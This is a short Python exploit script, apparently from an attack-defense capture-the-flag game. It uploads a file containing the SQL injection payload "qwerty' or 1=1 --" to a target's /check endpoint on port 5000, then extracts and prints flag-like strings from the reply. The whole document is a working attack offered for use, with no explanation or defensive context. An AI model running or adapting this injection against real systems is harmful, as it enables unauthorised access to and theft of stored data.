import requests
import sys
import re

if __name__ == "__main__":
    ip = sys.argv[1]
    url = f"http://{ip}:5000"
    key = {'profile': ('sploit.key', "qwerty' or 1=1 --")}
    try:
        r = requests.post(f'{url}/check', files=key)
        result = re.findall(r'[A-Z0-9]{31}=', r.text)
        if result:
            print(result)
    except:
        pass